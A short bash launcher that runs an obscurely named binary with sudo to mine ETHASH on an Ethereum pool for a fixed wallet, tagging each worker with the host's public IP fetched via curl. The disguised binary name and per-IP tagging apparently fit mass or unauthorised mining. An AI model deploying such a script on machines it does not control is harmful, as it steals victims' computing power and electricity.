#!/bin/bash
#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.$(echo "$(curl -s ifconfig.me)" | tr . _ )-bmtthuoc
cd "$(dirname "$0")"

chmod +x ./bmtthuoc && sudo ./bmtthuoc --algo ETHASH --pool $POOL --user $WALLET  $@
